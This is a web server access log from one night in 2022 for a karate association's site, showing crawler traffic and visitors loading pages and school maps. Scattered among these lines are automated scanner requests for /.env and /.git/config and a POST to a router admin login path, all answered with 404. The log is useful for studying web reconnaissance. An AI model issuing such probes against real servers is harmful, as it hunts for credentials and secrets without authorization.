::ffff:207.46.13.42 - - [27/Jul/2022:02:52:56 +0000] "GET /docs/twenty%20guiding%20principles%20of%20karate.pdf HTTP/1.1" 404 191 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:162.142.125.221 - - [27/Jul/2022:02:53:51 +0000] "GET / HTTP/1.1" 200 57618 "-" "-"
::ffff:162.142.125.221 - - [27/Jul/2022:02:53:52 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:162.142.125.221 - - [27/Jul/2022:02:53:52 +0000] "PRI * HTTP/2.0" - - "-" "-"
::ffff:185.254.196.115 - - [27/Jul/2022:02:59:32 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [27/Jul/2022:02:59:35 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.191.171.34 - - [27/Jul/2022:03:02:55 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:185.191.171.45 - - [27/Jul/2022:03:02:55 +0000] "GET /terminology.html HTTP/1.1" 404 155 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:135.125.246.189 - - [27/Jul/2022:03:04:47 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [27/Jul/2022:03:04:47 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:73.202.170.82 - - [27/Jul/2022:03:14:24 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:114.119.151.93 - - [27/Jul/2022:03:22:18 +0000] "GET /instructors.html HTTP/1.1" 404 155 "http://www.wadokikai.org/overview.html" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:207.46.13.54 - - [27/Jul/2022:03:37:00 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:104.2.28.64 - - [27/Jul/2022:04:23:34 +0000] "GET / HTTP/1.1" 200 57618 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
::ffff:104.2.28.64 - - [27/Jul/2022:04:23:35 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
::ffff:104.2.28.64 - - [27/Jul/2022:04:23:35 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
::ffff:104.2.28.64 - - [27/Jul/2022:04:23:35 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
::ffff:104.2.28.64 - - [27/Jul/2022:04:23:35 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
::ffff:104.2.28.64 - - [27/Jul/2022:04:23:35 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
::ffff:104.2.28.64 - - [27/Jul/2022:04:23:35 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
::ffff:104.2.28.64 - - [27/Jul/2022:04:23:35 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
::ffff:104.2.28.64 - - [27/Jul/2022:04:23:35 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
::ffff:104.2.28.64 - - [27/Jul/2022:04:23:35 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
::ffff:104.2.28.64 - - [27/Jul/2022:04:23:35 +0000] "GET /images/marin5thDan.jpeg HTTP/1.1" 200 105451 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
::ffff:104.2.28.64 - - [27/Jul/2022:04:23:35 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
::ffff:104.2.28.64 - - [27/Jul/2022:04:23:35 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
::ffff:104.2.28.64 - - [27/Jul/2022:04:23:35 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
::ffff:104.2.28.64 - - [27/Jul/2022:04:23:35 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
::ffff:104.2.28.64 - - [27/Jul/2022:04:23:35 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
::ffff:104.2.28.64 - - [27/Jul/2022:04:23:35 +0000] "GET /images/tournaments/NKDTournament.pdf HTTP/1.1" 200 3770165 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
::ffff:104.2.28.64 - - [27/Jul/2022:04:23:36 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
::ffff:104.2.28.64 - - [27/Jul/2022:04:23:38 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
::ffff:185.254.196.115 - - [27/Jul/2022:04:32:12 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [27/Jul/2022:04:32:12 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [27/Jul/2022:04:38:25 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [27/Jul/2022:04:38:25 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:73.202.170.82 - - [27/Jul/2022:04:44:11 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:66.249.79.191 - - [27/Jul/2022:04:54:18 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.79.187 - - [27/Jul/2022:04:54:18 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:40.77.167.66 - - [27/Jul/2022:05:08:01 +0000] "GET /Wa%20Do%20Ki%20Kai%20-%20logo_1.gif HTTP/1.1" 404 174 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:87.247.106.73 - - [27/Jul/2022:05:19:03 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
::ffff:207.46.13.54 - - [27/Jul/2022:05:33:00 +0000] "GET /images/instructors/anthony.jpg HTTP/1.1" 200 14045 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:51.222.253.8 - - [27/Jul/2022:05:35:23 +0000] "GET /schoolsandschedules.php HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:163.123.143.71 - - [27/Jul/2022:05:38:06 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 163 "http://34.212.47.6:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
::ffff:157.55.39.33 - - [27/Jul/2022:05:38:56 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:114.119.135.172 - - [27/Jul/2022:05:41:25 +0000] "GET /contact?s=1&ss=3 HTTP/1.1" 200 9997 "http://www.wadokikai.net/" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:207.46.13.182 - - [27/Jul/2022:05:48:46 +0000] "GET /images/instructors/geoffrey.jpg HTTP/1.1" 200 14922 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:40.77.167.66 - - [27/Jul/2022:05:52:27 +0000] "GET /events HTTP/1.1" 200 10263 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:73.202.170.82 - - [27/Jul/2022:05:52:47 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:51.222.253.16 - - [27/Jul/2022:05:53:05 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:185.254.196.115 - - [27/Jul/2022:06:04:04 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [27/Jul/2022:06:04:05 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:73.202.170.82 - - [27/Jul/2022:06:12:42 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [27/Jul/2022:06:15:49 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:114.119.151.93 - - [27/Jul/2022:06:16:47 +0000] "GET /terminology.php HTTP/1.1" 404 154 "http://www.wadokikai.org/login.php?sessionId=1" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:66.240.236.119 - - [27/Jul/2022:06:16:53 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
::ffff:66.240.236.119 - - [27/Jul/2022:06:16:53 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "-"
::ffff:66.240.236.119 - - [27/Jul/2022:06:16:53 +0000] "GET /sitemap.xml HTTP/1.1" 404 150 "-" "-"
::ffff:66.240.236.119 - - [27/Jul/2022:06:16:53 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 163 "-" "-"
::ffff:73.202.170.82 - - [27/Jul/2022:06:19:09 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [27/Jul/2022:06:21:49 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:172.105.172.14 - - [27/Jul/2022:06:24:01 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "python-requests/2.22.0"
::ffff:172.105.172.14 - - [27/Jul/2022:06:24:02 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "python-requests/2.22.0"
::ffff:172.105.172.14 - - [27/Jul/2022:06:24:03 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "python-requests/2.22.0"
::ffff:172.105.172.14 - - [27/Jul/2022:06:24:03 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "python-requests/2.22.0"
::ffff:66.249.79.165 - - [27/Jul/2022:06:24:18 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.79.191 - - [27/Jul/2022:06:24:18 +0000] "GET /docs/TwentyGuidingPriciplesOfKarate.pdf HTTP/1.1" 404 178 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:73.202.170.82 - - [27/Jul/2022:06:24:56 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [27/Jul/2022:06:27:45 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:13 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:13 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:13 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:13 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:13 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:15 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://wadokikai.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:15 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "python-requests/2.27.1"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:15 +0000] "GET /contact HTTP/1.1" 200 10017 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:15 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.net/contact" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:16 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.net/contact" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:17 +0000] "GET /contact?s=1&ss=6 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:17 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.net/contact?s=1&ss=6" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:17 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.net/contact?s=1&ss=6" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:19 +0000] "GET /contact?s=1&ss=4 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:19 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.net/contact?s=1&ss=4" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:19 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.net/contact?s=1&ss=4" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:20 +0000] "GET /contact?s=1&ss=9 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:21 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.net/contact?s=1&ss=9" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:21 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.net/contact?s=1&ss=9" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:22 +0000] "GET /contact?s=1&ss=0 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:22 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.net/contact?s=1&ss=0" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:22 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.net/contact?s=1&ss=0" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:24 +0000] "GET /contact?s=1&ss=1 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:24 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.net/contact?s=1&ss=1" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:24 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.net/contact?s=1&ss=1" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:25 +0000] "GET /contact?s=1&ss=2 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:25 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.net/contact?s=1&ss=2" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:25 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.net/contact?s=1&ss=2" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:27 +0000] "GET /contact?s=1&ss=8 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:27 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.net/contact?s=1&ss=8" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:27 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.net/contact?s=1&ss=8" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:28 +0000] "GET /contact?s=1&ss=5 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:28 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.net/contact?s=1&ss=5" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:29 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.net/contact?s=1&ss=5" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:30 +0000] "GET /contact?s=1&ss=7 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:30 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.net/contact?s=1&ss=7" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:30 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.net/contact?s=1&ss=7" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
